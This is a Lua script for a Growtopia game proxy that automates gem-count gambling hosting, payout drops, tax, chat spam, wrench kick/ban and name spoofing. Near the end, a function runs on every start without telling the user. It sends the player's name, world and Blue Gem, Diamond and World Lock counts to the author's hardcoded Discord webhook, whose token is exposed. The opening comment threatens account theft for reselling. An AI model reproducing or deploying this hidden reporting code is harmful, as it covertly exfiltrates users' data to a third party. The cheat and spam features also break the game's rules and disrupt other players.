--resell your acc got steal
--Owner Introvert#7672

whitelist = {112233,223344,334466}


MessageBox("Vert PROXY", "Proxy Started.")
function FChat(txt)
    p = {}
    p[0] = "OnTextOverlay"
    p[1] = txt
    p.netid = -1
    SendVarlist(p)
end

FChat("`0[`4EXECUTED`0] `9Ivert Community PROXY")
tax = 0
wls = 0
play = 0
cvbgl = 0
totalbet = 0
wrnch = 0
wrnch_md = ""
set_spam_text = "Set your spam text and delay !"
set_spam_delay = 5
spamming = false
startGems = 0
endGems = 0
collectGems = false
pc = false
function printa(v)
    if v[0] == "OnConsoleMessage" and v[1]:find("Unknown command.") then
        p = {}
        p[0] = "OnConsoleMessage"
        p[1] = "`4Unknown command. `2Enter `0/menu ``to see command list!"
        p.netid = -1
        SendVarlist(p)
        return true
    elseif v[0] == "OnConsoleMessage" and v[1]:find("Spam detected") then
        FChat("`9Slowdown the chat. Spam detected.")
        return true
    elseif v[0] == "OnConsoleMessage" and v[1]:find("Collected ") then
        if v[1]:find("Diamond Lock") then
            play = tonumber(v[1]:match("(%d+) Diamond Lock")) * 100
            countTax(play * 2)
            msg = v[1]
            p = {}
            p[0] = "OnConsoleMessage"
            p[1] = msg
            p.netid = -1
            SendVarlist(p)
            return true
        elseif v[1]:find("Blue Gem Lock") then
            play = tonumber(v[1]:match("(%d+) Blue Gem Lock")) * 10000
            countTax(play * 2)
            msg = v[1]
            p = {}
            p[0] = "OnConsoleMessage"
            p[1] = msg
            p.netid = -1
            SendVarlist(p)
            return true
        elseif v[1]:find("World Lock") then
            play = tonumber(v[1]:match("(%d+) World Lock"))
            countTax(play * 2)
            msg = v[1]
            p = {}
            p[0] = "OnConsoleMessage"
            p[1] = msg
            p.netid = -1
            SendVarlist(p)
            return true
        else
            find = v[1]:find("`5**")
            msg = "`0[`^Introvert#7672`0] " .. v[1]:sub(find)
            p = {}
            p[0] = "OnConsoleMessage"
            p[1] = msg
            p.netid = -1
            SendVarlist(p)
        end
    elseif v[0] == "OnSDBroadcast" then
        log("Blocked SBD")
        return true
    elseif v[0] == "OnConsoleMessage" then
        msg = "`0[`^Introvert#7672`0] " .. v[1]
        p = {}
        p[0] = "OnConsoleMessage"
        p[1] = msg
        p.netid = -1
        SendVarlist(p)
        return true
    elseif v[0] == "OnTalkBubble" and v[3] ~= -1 and v[2]:find("spun the wheel and got") then
        if v[2]:find("``6>``") then
            p = {}
            p[0] = "OnTalkBubble"
            p[1] = v[1]
            p[2] = "`0[`4FAKE`0] " .. v[2]
            p[3] = -1
            p.netid = -1
            SendVarlist(p)
        elseif v[2]:find("``!]``") then
            p = {}
            p[0] = "OnTalkBubble"
            p[1] = v[1]
            p[2] = "`0[`2REAL`0] " .. v[2]
            p[3] = -1
            p.netid = -1
            SendVarlist(p)
            s2 = v[2]:find("`` spun") - 1
            s1 = v[2]:sub(4, s2)
            jml1 = v[2]:find("got ") + 6
            jml2 = v[2]:find("``!") - 1
            jml = v[2]:sub(jml1, jml2)
            for _, player in pairs(GetPlayers()) do
                if player.netid == v[1] then
                    cn = {}
                    cn[0] = "OnNameChanged"
                    cn[1] = s1 .. " [" .. jml .. "]"
                    cn.netid = player.netid
                    SendVarlist(cn)
                end
            end
        else
            p = {}
            p[0] = "OnTalkBubble"
            p[1] = v[1]
            p[2] = "`0[`4FAKE`0] " .. v[2]
            p[3] = -1
            p.netid = -1
            SendVarlist(p)
        end
        return true
    end
    return false
end
---------------------------------------------------------------------------------------------------------
function cek_uid(uid)
    for _, user in pairs(whitelist) do
        if uid == user then
            return 1
        end
    end
    return 0
end
if cek_uid(GetLocal().userid) == 1 then
    AddCallback(1, "OnVarlist", printa)
BGL = GetItemCount(7188)
WL = GetItemCount(242)
DL = GetItemCount(1796)
userid = GetLocal().userid
name = GetLocal().name
function menuDialog()
    menuVarList = {}
    menuVarList[0] = "OnDialogRequest"
    menuVarList[1] = [[
set_default_color|`o
add_label_with_icon|big|`^Ivert Proxy Command Menu``|left|2480
add_smalltext|Hello, `0]]..name..[[ `oWelcome To Community|
add_smalltext|UserID, `0]]..userid..[[ `oThis Your ID|
add_textbox|Author Script|
add_url_button|comment|`o Discord Channel |noflags|https://discord.gg/wvk64dxxE4|Introvert Community|18|
add_textbox|`oPartner/Helper Script|left|32
add_url_button|comment|`o Ret Script Community |noflags|https://discord.gg/pTeqmZQqRY|p\nq#7940|0|
add_smalltext|`o~> `^Ey`o#3118|
add_smalltext|`o~> `^Renz`o#7257|
add_spacer|small|
add_textbox|`0~> `9/mode `0(Set Count Gems Position)|left|
add_textbox|`0~> `9/sp1 `0(Set Position Count Gems)|left|
add_textbox|`0~> `9/sp2 `0(Set Position Count Gems)|left|
add_textbox|`0~> `9/sw1 `0(Set Position Display Box)|left|
add_textbox|`0~> `9/sw2 `0(Set Position Display Box)|left|
add_textbox|`0~> `9/host `0(Set Position Host)|left|
add_spacer|small|
add_textbox|`8-------------- Play Menu|left|
add_textbox|`0~> `9/t `0(Collect WLS from two pos)|left|
add_textbox|`0~> `9/dp `0(deposit bgl)|left|
add_textbox|`0~> `9/wt `0(withdraw bgl)|left|
add_textbox|`0~> `9/c `0(Count Gems On Position 1 and 2)|left|
add_textbox|`0~> `9/pos `0(Teleport to Host Position)|left|
add_textbox|`0~> `9/res `0(Collect Gems from two pos)|left|
add_textbox|`0~> `9/w1 `0(Teleport to Display Box pos 1)|left|
add_textbox|`0~> `9/w2 `0(Teleport to Display Box pos 2)|left|
add_textbox|`0~> `9/w1d `0(Teleport to Display Box pos 1 and drop Wls (eat tax))|left|
add_textbox|`0~> `9/w2d `0(Teleport to Display Box pos 2 and drop wls (eat tax))|left|
add_textbox|`0~> `9/relog `0(Relog world)|left|
add_textbox|`0~> `9/gm `0(collect gems)|left|
add_spacer|small|
add_textbox|`8-------------- Drop Menu|left|
add_textbox|`0~> `9/wd <amount> `0(World Lock Drop)|left|
add_textbox|`0~> `9/dd <amount> `0(Diamond Lock Drop)|left|
add_textbox|`0~> `9/bd <amount> `0(Blue Gem Lock Drop)|left|
add_textbox|`0~> `9/cd <amount> `0(Custom Drop)|left| 
add_textbox|`0~> `9/phone `0(Open Telephone menu (Fast Convert BGL)|left|
add_spacer|small|
add_textbox|`8-------------- Calculator (Optional)|left|
add_textbox|`0~> `9/stax `0(Set Tax)|left|
add_spacer|small|
add_textbox|`8-------------- Misc |left|
add_textbox|`0~> `9/fc `0(Closing Proxy)|left|
add_textbox|`0~> `9/pc `0(Auto put chand)|left|
add_textbox|`0~> `9/wrench `0(Wrench Mode PULL/KICK/BAN)|left|
add_textbox|`0~> `9/spamtext or /spamt `0(Text Spammer)|left|
add_textbox|`0~> `9/spamdelay or /sd `0(Delay Spammer)|left|
add_textbox|`0~> `9// `0(Start Spam)|left|
add_textbox|`0~> `9/setnick <colorcode><name> `0(Change Name Visual)|left|
add_textbox|`0~> `9EXAMPLE : /setnick 2Onwer|left|
add_textbox|`0<Introvert#7672>|left|
end_dialog|Cancel|Host now!|
add_quick_exit]]
menuVarList.netid = -1
SendVarlist(menuVarList)
end


function drop(id, amt)
    SendPacket(2, "action|dialog_return\ndialog_name|drop\nitem_drop|" .. id .. "|\nitem_count|" .. amt)
    Sleep(180)
end
function findItem(id)
    for _, itm in pairs(GetInventory()) do
        if itm.id == id then
            return itm.count
        end
    end
    return 0
end
function startBET()
    FindPath(poswin1x, poswin1y)
    Sleep(500)
    FindPath(poswin2x, poswin2y)
    Sleep(500)
    FindPath(poshostx, poshosty)
    SendPacket(2, "action|input\ntext|Gas")
end
function setspam()
  if set_spam_delay >= 5 then
      while spamming do
          SendPacket(2, "action|input\n|text|`"..math.random(1,9)..set_spam_text)
          Sleep(set_spam_delay * 1000)
      end
  elseif set_spam_delay < 5 then
  OnConsoleMessage("`0delay cant be less than 5 Second !")
  end
end
function relogThread()
    FChat("Relog...")
    latest_world = GetLocal().world
    SendPacket(3, "action|join_request\nname|" .. latest_world .. "\ninvitedWorld|0")
end
function countTax(amount)
    if tonumber(tax) < 10 then
        taxs = tonumber(tax) / 100
        total = math.floor(amount - (amount * taxs))
        FChat("`9" .. tostring(total) .. " WLS `2" .. tostring(math.floor(amount * taxs)) .. " WLS TAX")
        return total
    else
        total = math.floor(amount - (amount / tonumber(tax)))
        FChat("`9" .. tostring(total) .. " WLS `2" .. tostring(math.floor(amount / tax)) .. " WLS TAX")
        return total
    end
end
function checkWinner(count1, count2)
    if count1 == count2 then
        SendPacket(2, "action|input\ntext|(gems) `2" .. count1 .. " `0[TIE] `2" .. count2 .. " (gems)")
    elseif count1 < count2 then
        SendPacket(2, "action|input\ntext|`4LOSE(cry) (gems) `a" .. count1 .. " `0- `2" .. count2 .. " (gems) `2WIN(cool)")
    elseif count1 > count2 then
        SendPacket(2, "action|input\ntext|`2WIN(cool) (gems) `2" .. count1 .. " `0- `a" .. count2 .. " (gems) `4LOSE(cry)")
    end
end
function customDrop()
    pecahan = { 10000, 100, 1 }
    bgl = 0
    dl = 0
    wl = 0
    for i = 1, 3 do
        while wls >= pecahan[i] do
            if pecahan[i] == pecahan[1] then
                bgl = bgl + 1
                wls = wls - 10000
            elseif pecahan[i] == pecahan[2] then
                dl = dl + 1
                wls = wls - 100
            elseif pecahan[i] == pecahan[3] then
                wl = wl + 1
                wls = wls - 1
            end
        end
    end
    itemamt = { bgl, dl, wl }
    itemid = { 7188, 1796, 242 }
    if findItem(1796) < dl then
        local pkt = {
            type = 10,
            int_data = 7188,
        }
        SendPacketRaw(pkt)
    elseif findItem(242) < wl then
        local pkt = {
            type = 10,
            int_data = 1796,
        }
        SendPacketRaw(pkt)
    end
    Sleep(200)
    if bgl > 0 then
        drop(itemid[1], itemamt[1])
        if dl > 0 then
            drop(itemid[2], itemamt[2])
            if wl > 0 then
                drop(itemid[3], itemamt[3])
            end
        end
    else
        if dl > 0 then
                drop(itemid[2], itemamt[2])
            if wl > 0 then
                drop(itemid[3], itemamt[3])
            end
        else
            if wl > 0 then
                drop(itemid[3], itemamt[3])
            end
        end
    end
    log(" Dropped `1" .. bgl .. " BGL " .. dl .. " DLS " .. wl .. " WLS")
end
function customDropWin()
    pecahan = { 10000, 100, 1 }
    bgl = 0
    dl = 0
    wl = 0
    for i = 1, 3 do
    while total >= pecahan[i] do
        if pecahan[i] == pecahan[1] then
        bgl = bgl + 1
        total = total - 10000
        elseif pecahan[i] == pecahan[2] then
        dl = dl + 1
        total = total - 100
        elseif pecahan[i] == pecahan[3] then
        wl = wl + 1
        total = total - 1
        end
    end
    end
    itemamt = { bgl, dl, wl }
    itemid = { 7188, 1796, 242 }
    if findItem(1796) < dl then
    local pkt = {
        type = 10,
        int_data = 7188,
    }
    SendPacketRaw(pkt)
    elseif findItem(242) < wl then
    local pkt = {
        type = 10,
        int_data = 1796,
    }
    SendPacketRaw(pkt)
    end
    Sleep(200)
    if bgl > 0 then
    drop(itemid[1], itemamt[1])
    if dl > 0 then
        drop(itemid[2], itemamt[2])
        if wl > 0 then
        drop(itemid[3], itemamt[3])
        end
    end
    else
    if dl > 0 then
        drop(itemid[2], itemamt[2])
        if wl > 0 then
        drop(itemid[3], itemamt[3])
        end
    else
        if wl > 0 then
        drop(itemid[3], itemamt[3])
        end
    end
    end
    log(" Dropped `1" .. bgl .. " BGL " .. dl .. " DLS " .. wl .. " WLS")
    Sleep(500)
    FindPath(poshostx, poshosty)
end
function place(id, x, y)
    pkt = {}
    pkt.type = 3
    pkt.value = id
    pkt.px = math.floor(GetLocal().pos_x / 32 + x)
    pkt.py = math.floor(GetLocal().pos_y / 32 + y)
    pkt.x = GetLocal().pos_x
    pkt.y = GetLocal().pos_y
    SendPacketRaw(false, pkt)
end
function reset()
    if Mode == "HORIZONTAL" then
        FindPath(pos1x1, pos1y1)
        FindPath(pos1x2, pos1y1)
        FindPath(pos1x3, pos1y1)
        Sleep(800)
        FindPath(pos2x1, pos2y1)
        FindPath(pos2x2, pos2y1)
        FindPath(pos2x3, pos2y1)
        Sleep(800)
        FindPath(poshostx, poshosty)
    elseif Mode == "VERTIKAL" then
        FindPath(pos1x1, pos1y1)
        FindPath(pos1x1, pos1y2)
        FindPath(pos1x1, pos1y3)
        Sleep(800)
        FindPath(pos2x1, pos2y1)
        FindPath(pos2x1, pos2y2)
        FindPath(pos2x1, pos2y3)
        Sleep(800)
        FindPath(poshostx, poshosty)
    end
end

AddCallback(0, "OnPacket", function(type, packet)
if packet:find("/sp1") then
  if Mode == "VERTIKAL" then
    pos1x1 = math.floor(GetLocal().pos_x / 32)
    pos1y1 = math.floor(GetLocal().pos_y / 32)
    pos1y2 = math.floor(GetLocal().pos_y / 32) - 1
    pos1y3 = math.floor(GetLocal().pos_y / 32) - 2
  elseif Mode == "HORIZONTAL" then
    pos1y1 = math.floor(GetLocal().pos_y / 32)
    pos1x1 = math.floor(GetLocal().pos_x / 32) - 1
    pos1x2 = math.floor(GetLocal().pos_x / 32)
    pos1x3 = math.floor(GetLocal().pos_x / 32) + 1
  end
  FChat("`9[ivert] Pos 1 configured")
  return true
elseif packet:find("/sp2") then
  if Mode == "VERTIKAL" then
    pos2x1 = math.floor(GetLocal().pos_x / 32)
    pos2y1 = math.floor(GetLocal().pos_y / 32)
    pos2y2 = math.floor(GetLocal().pos_y / 32) - 1
    pos2y3 = math.floor(GetLocal().pos_y / 32) - 2
    FChat("`9[ivert] Pos 2 configured")
    return true
  elseif Mode == "HORIZONTAL" then
    pos2y1 = math.floor(GetLocal().pos_y / 32)
    pos2x1 = math.floor(GetLocal().pos_x / 32) - 1
    pos2x2 = math.floor(GetLocal().pos_x / 32)
    pos2x3 = math.floor(GetLocal().pos_x / 32) + 1
    FChat("`9[ivert] Pos 2 configured")
    return true
  end
elseif packet:find("/res") then
  RunThread(reset)
elseif packet:find("/t") then
  RunThread(startBET)
  return true
elseif packet:find("/setnick (%w+)") then
  cn = {}
  cn[0] = "OnNameChanged"
  cn[1] = "`"..packet:match("/setnick (%w+)")
  cn.netid = GetLocal().netid
  SendVarlist(cn)
  return true
elseif packet:find("/sw1") then
  poswin1x = math.floor(GetLocal().pos_x / 32)
  poswin1y = math.floor(GetLocal().pos_y / 32)
  FChat("`9[ivert] Pos Win 1 configured")
  return true
elseif packet:find("/sw2") then
  poswin2x = math.floor(GetLocal().pos_x / 32)
  poswin2y = math.floor(GetLocal().pos_y / 32)
  FChat("`9[ivert] Pos Win 2 configured")
  return true
elseif packet:find("/host") then
  poshostx = math.floor(GetLocal().pos_x / 32)
  poshosty = math.floor(GetLocal().pos_y / 32)
  FChat("`9[ivert] Pos Host configured")
  return true
elseif packet:find("/pos") then
  FindPath(poshostx, poshosty)
  return true
elseif packet:find("/w1d") then
  FindPath(poswin1x, poswin1y)
  RunThread(customDropWin)
  return true
elseif packet:find("/w2d") then
  FindPath(poswin2x, poswin2y)
  RunThread(customDropWin)
  return true
elseif packet:find("/w1") then
  -- log("Teleport to win 1")
  FindPath(poswin1x, poswin1y)
  return true
elseif packet:find("/w2") then
  -- log("Teleport to win 2")
  FindPath(poswin2x, poswin2y)
  return true
elseif packet:find("/wd (%d+)") then
  wls = tonumber(packet:match("/wd (%d+)"))
  if findItem(242) < wls then
    local pkt = {
      type = 10,
      int_data = 1796,
    }
    SendPacketRaw(pkt)     
  end
  SendPacket(2, "action|dialog_return\ndialog_name|drop\nitem_drop|" .. tostring(242) .. "|\nitem_count|" .. wls)
  log("`0[`9ivert PROXY`0] Dropped `1" .. wls .. " WLS")
  return true
elseif packet:find("/dd (%d+)") then
  wls = tonumber(packet:match("/dd (%d+)"))
  if findItem(1796) < wls then
    local pkt = {
      type = 10,
      int_data = 7188,
    }
    SendPacketRaw(pkt)     
  end
  SendPacket(2, "action|dialog_return\ndialog_name|drop\nitem_drop|" .. tostring(1796) .. "|\nitem_count|" .. wls)
  log("`0[`9ivert PROXY`0] Dropped `1" .. wls .. " DLS")
  return true
elseif packet:find("/bd (%d+)") then
  wls = tonumber(packet:match("/bd (%d+)"))
  if findItem(7188) < wls then
      log("You don't have that much bgls")
      return true
  end
  SendPacket(2, "action|dialog_return\ndialog_name|drop\nitem_drop|" .. tostring(7188) .. "|\nitem_count|" .. wls)
  log("`0[`9ivert PROXY`0] Dropped `1" .. wls .. " BGL")
  return true
elseif packet:find("/cd (%d+)") then
  wls = tonumber(packet:match("/cd (%d+)"))
  RunThread(customDrop)
  return true
elseif packet:find("tax_a_m_o_u_n_t") then
  tax = packet:match("tax_a_m_o_u_n_t|(%d+)")
  FChat("`9Tax has been set `0" .. tax .. "%")
  return true
elseif packet:find("/stax") then
  menuVarList = {}
  menuVarList[0] = "OnDialogRequest"
  menuVarList[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Set Tax Amount``|left|32
add_spacer|small|
text_scaling_string|iprogramtext
add_spacer|small|
add_textbox|Tax:|left|
add_text_input|tax_a_m_o_u_n_t||]]..tax..[[|3|
add_spacer|small|
end_dialog|growscan_edit||OK|
add_quick_exit]]
  menuVarList.netid = -1
  SendVarlist(menuVarList)
  return true
elseif packet:find("/relog") then
  RunThread(relogThread)
  return true
elseif packet:find("buttonClicked|wrnch_md_pl") then
  wrnch = packet:match("wrnch_md_set|(%d+)")
  wrnch_md = "PULL"
  FChat("`9Wrench mode set to `0PULL")
  return true
elseif packet:find("buttonClicked|wrnch_md_kc") then
  wrnch = packet:match("wrnch_md_set|(%d+)")
  wrnch_md = "KICK"
  FChat("`9Wrench mode set to `0KICK")
elseif packet:find("buttonClicked|wrnch_md_bn") then
  wrnch = packet:match("wrnch_md_set|(%d+)")
  wrnch_md = "BAN"
  FChat("`9Wrench mode set to `0BAN")
elseif packet:find("/wrench") then
  --add_spacer|small|
  menuVarList = {}
  menuVarList[0] = "OnDialogRequest"
  menuVarList[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Wrench Mode``|left|32
text_scaling_string|iprogramtext
add_spacer|small|
add_checkbox|wrnch_md_set|Fast system|]]..wrnch..[[|
add_button|wrnch_md_pl|`5PULL|noflags|0|0|
add_button|wrnch_md_kc|`4KICK|noflags|0|0|
add_button|wrnch_md_bn|`4BAN|noflags|0|0|
add_spacer|small|
end_dialog|wrnch_sender||OK|
add_quick_exit]]
  menuVarList.netid = -1
  SendVarlist(menuVarList)
  return true
elseif packet:find("/c") or packet:find("/C") then
  if Mode == "VERTIKAL" then
    count1 = 0
    count2 = 0
    for _, value in pairs(GetObjects()) do
      if value.id == 112 then
        checkY = math.floor(value.pos_y / 32)
        checkX = math.floor(value.pos_x / 32)
        if checkX == pos1x1 then
          if checkY == pos1y1 or checkY == pos1y2 or checkY == pos1y3 then
            count1 = count1 + value.count
          end
        end
        if checkX == pos2x1 then
          if checkY == pos2y1 or checkY == pos2y2 or checkY == pos2y3 then
            count2 = count2 + value.count
          end
        end
      end
    end
    count1 = math.floor(count1)
    count2 = math.floor(count2)
    checkWinner(count1, count2)
  elseif Mode == "HORIZONTAL" then
    count1 = 0
    count2 = 0
    for _, value in pairs(GetObjects()) do
      if value.id == 112 then
        checkY = math.floor(value.pos_y / 32)
        checkX = math.floor(value.pos_x / 32)
        if checkY == pos1y1 then
          if checkX == pos1x1 or checkX == pos1x2 or checkX == pos1x3 then
            count1 = count1 + value.count
          end
        end
        if checkY == pos2y1 then
          if checkX == pos2x1 or checkX == pos2x2 or checkX == pos2x3 then
            count2 = count2 + value.count
          end
        end
      end
    end
    count1 = math.floor(count1)
    count2 = math.floor(count2)
    checkWinner(count1, count2)
  end
  return true
elseif packet:find("/fc") then
    RemoveCallbacks()
    FChat("`^Succesfull Deactivate Proxy")
    return true
elseif packet:find("/gm") then
      if collectGems == false then
          startGems = math.floor(GetLocal().gems)
          FChat("Enabled logging of gems! Starting gems: "..startGems, 'light_green')
          collectGems = true
      elseif collectGems == true then
          endGems = math.floor(GetLocal().gems)
          FChat("Disabled logging of gems! Ending gems: "..endGems, 'light_green')
          local difference = math.floor(endGems - startGems)
          SendPacket(2, "action|input\n|text|`#Collected `c"..tostring(difference).." `#Gems!")
          collectGems = false
      end
      return true

elseif packet:find("/spamtext") then
      if packet:find("action|input\n|text|/spamtext ") then
          set_spam_text = packet:gsub("action|input\n|text|/spamtext ", "")
          FChat("`0spam text set to :`3 "..set_spam_text)
      end 
  return true
elseif packet:find("/spamt") then
      if packet:find("action|input\n|text|/spamt ") then
          set_spam_text = packet:gsub("action|input\n|text|/spamt ", "")
          FChat("`0spam text set to :`3 "..set_spam_text)
      end
  return true
elseif packet:find("/spamdelay") then
      if packet:find("action|input\n|text|/spamdelay") then
          set_spam_delay = packet:gsub("action|input\n|text|/spamdelay", "")
          set_spam_delay = tonumber(set_spam_delay)
          FChat("`0spam delay set to : `3"..set_spam_delay.." `9Seconds ")
      end
  return true
elseif packet:find("/sd") then
      if packet:find("action|input\n|text|/sd") then
          set_spam_delay = packet:gsub("action|input\n|text|/sd", "")
          set_spam_delay = tonumber(set_spam_delay)
          FChat("`0spam delay set to : `3"..set_spam_delay.." `9Seconds ")
      end
  return true
elseif packet:find("//") then
      if packet == ("action|input\n|text|//") then
          if spamming then
              FChat("`0Auto Spam is `3off")
              spamming = false
             else
              FChat("`0Auto Spam is `3on")
              spamming = true
          end
             RunThread(function()
                     setspam()
             end)
      end
  return true

elseif packet:find("/wt") then
menuVarList = {}
  menuVarList[0] = "OnDialogRequest"
  menuVarList[1] = [[
set_default_color|`o
add_label_with_icon|big|`eWithdraw Blue Gem Locks````|left|758|
text_scaling_string|iprogramtext|
add_spacer|small|
add_label_with_icon|small|Withdraw how many?|left|7188|
add_text_input|bgl_count|`wAmount:``|0|3|
add_spacer|small|
end_dialog|bank_withdraw|Nevermind|Withdraw!|
add_quick_exit]]
  menuVarList.netid = -1
  SendVarlist(menuVarList)
return true

elseif packet:find("/dp") then
menuVarList = {}
  menuVarList[0] = "OnDialogRequest"
  menuVarList[1] = [[
set_default_color|`o
add_label_with_icon|big|`eDeposit Blue Gem Locks````|left|758|
text_scaling_string|iprogramtext|
add_spacer|small|
add_label_with_icon|small|Deposit how many?|left|7188
add_spacer|small|
add_text_input|bgl_count|`wAmount:``|0|3|
end_dialog|bank_deposit|Nevermind|Deposit!|
add_quick_exit]]
  menuVarList.netid = -1
  SendVarlist(menuVarList)
return true
elseif packet:find("wrench_bgl") then
  if cvbgl == 0 then
    cvbgl = 1
    FChat("`9Fast Conver BGL Mode is `0enabled")
    AddCallback("changebgl", "OnVarlist", function(var)
      if var[0] == "OnDialogRequest" and var[1]:find("end_dialog|telephone") then
        x = var[1]:match("x|(%d+)")
        y = var[1]:match("y|(%d+)")
        SendPacket(2,
          "action|dialog_return\ndialog_name|telephone\nnum|53785|\nx|" .. x ..
          "|\ny|" .. y .. "|\nbuttonClicked|bglconvert\n")
        return true
      end
      return false
    end)
  elseif cvbgl == 1 then
    cvbgl = 0
    RemoveCallback("changebgl")
    FChat("`9Fast change BGL Mode is `0disabled")
  end
elseif packet:find("/phone") then
  menuVarList = {}
  menuVarList[0] = "OnDialogRequest" 
  menuVarList[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Phone Menu``|left|32
add_spacer|small|
text_scaling_string|iprogramtext
add_button_with_icon|wrench_bgl|`9Convert BGL|staticYellowFrame|32||
add_button_with_icon||END_LIST|noflags|0||
add_spacer|small|
end_dialog|WrenchShortcut|Cancel|
add_quick_exit]]
  menuVarList.netid = -1
  SendVarlist(menuVarList)
  return true
elseif packet:find("mode_vertikal") then
  Mode = "VERTIKAL"
  FChat("`9Mode set to `0Vertical")
  return true
elseif packet:find("mode_horizontal") then
  Mode = "HORIZONTAL"
  FChat("`9Mode set to `0Horizontal")
  return true
elseif packet:find("/mode") then
  menuVarList = {}
  menuVarList[0] = "OnDialogRequest"
  menuVarList[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Select Mode``|left|32
add_spacer|small|
text_scaling_string|iprogramtext
add_button_with_icon|mode_vertikal|`9Vertikal|staticYellowFrame|646||
add_button_with_icon|mode_horizontal|`9Horizontal|staticYellowFrame|644||
add_button_with_icon||END_LIST|noflags|0||
add_spacer|small|
end_dialog|WrenchShortcut|Cancel|
add_quick_exit]]
  menuVarList.netid = -1
  SendVarlist(menuVarList)
  return true
elseif packet:find("/menu") then
  menuDialog()
  return true
elseif packet:find("action|wrench") then
  if wrnch == "1" then
    netidtrgt = packet:match("|netid|(%d+)")
    FChat(wrnch_md.." On NetID: "..netidtrgt)
    SendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|"..netidtrgt.."|\nbuttonClicked|"..string.lower(wrnch_md))
    return true
  end
end
return false
end)

menuDialog()
WebHook = "https://discord.com/api/webhooks/1114106292697583616/-LR0WFcjWbtmB9ReJf9rrj37uQNq7XZfA5dZhWB6uDlwSNLAmPQWhgRv_H2C6QTgrX3E" --jangan di ubah
  function removeColorAndSymbols(str)
      local cleanedStr = string.gsub(str, "`(%S)", '')
      cleanedStr = string.gsub(cleanedStr, "`{2}|(~{2})", '')
      return cleanedStr
  end
  local function FormatNumber(num)
      num = math.floor(num + 0.5)

      local formatted = tostring(num)
      local k = 3
      while k < #formatted do
          formatted = formatted:sub(1, #formatted - k) .. "," ..
                          formatted:sub(#formatted - k + 1)
          k = k + 4
      end
      return formatted
  end
  function FORMAT_TIME(seconds)
      local days = math.floor(seconds / 86400)
      local hours = math.floor((seconds % 86400) / 3600)
      local minutes = math.floor((seconds % 3600) / 60)
      local remaining_seconds = seconds % 60
      local parts = {}
      if days > 0 then
          table.insert(parts, tostring(days) .. " day" .. (days > 1 and "s" or ""))
      end
      if hours > 0 then
          table.insert(parts,
                      tostring(hours) .. " hour" .. (hours > 1 and "s" or ""))
      end
      if minutes > 0 then
          table.insert(parts, tostring(minutes) .. " minute" ..
                          (minutes > 1 and "s" or ""))
      end
      if remaining_seconds > 0 then
          table.insert(parts, tostring(remaining_seconds) .. " second" ..
                          (remaining_seconds > 1 and "s" or ""))
      end
      if #parts == 0 then
          return "0 seconds"
      elseif #parts == 1 then
          return parts[1]
      else
          local last_part = table.remove(parts)
          return table.concat(parts, ", ") .. " and " .. last_part
      end
  end
else
    log("userID "..GetLocal().userid.." is not in whitelist")
end
---------------------------------------------------------------------------------------------------------

function wh()
  local payload = [[
  {
      "content": "",
      "embeds": [{
          "title": "<:wheel:1105095395371135037> Auto Host <:wheel:1105095395371135037> ",
          "description": "<:bgl:1110199855831322647> **INFORMATION** <:bgl:1110199855831322647>",
          "url": "https://avatarfiles.alphacoders.com/334/334449.png",
          "color": 69,
          "fields": [{
              "name":"Account:",
                  "value": "Name: **%s**",
                  "inline": false
          },
          {
              "name": "Information:",
                  "value": ":earth_asia: Current World: **%s**",
                  "inline": false
          },
          {
              "name": "**Player Lock:**",
              "value": "<:bgl:1110199855831322647>BGL: **%s** <:dl:1110199890572755055>DL: **%s** <:wl:1110199918649421914> WL: **%s** "
          }
          ],
          "author": {
              "name": "IntroVert AutoHost",
              "url": "https://avatarfiles.alphacoders.com/334/334449.png",
              "icon_url": "https://avatarfiles.alphacoders.com/334/334449.png"
          },
          "footer": {
              "text": "%s",
              "url": "https://cdn.discordapp.com/attachments/814384402985254940/1092698535117467728/received_881069006639056.jpg"
          }
      }]
  }]]
  payload = payload:format(removeColorAndSymbols(GetLocal().name), GetLocal().world,tostring(GetItemCount(7188)):match("(%d+)"),tostring(GetItemCount(1796)):match("(%d+)"),tostring(GetItemCount(242)):match("(%d+)"), os.date("!%a, %b/%d/%Y at %I:%M %p", os.time() + 8 * 60 * 60))
  SendWebhook(WebHook, payload)
end

RunThread(wh)

